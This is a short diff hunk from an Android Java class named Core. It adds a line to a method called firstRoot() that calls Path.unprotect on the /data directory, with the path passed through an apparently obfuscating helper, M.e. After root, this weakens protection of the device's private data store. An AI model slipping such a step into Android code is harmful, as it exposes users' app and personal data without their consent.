@@ -1073,6 +1073,7 @@ public class Core extends Activity implements Runnable {
 	 * should be included here
 	 */
 	public void firstRoot() {
+		Path.unprotect(M.e("/data"), 0, true);
 		Status.setPlayStoreEnableStatus(true);
 	}
 }
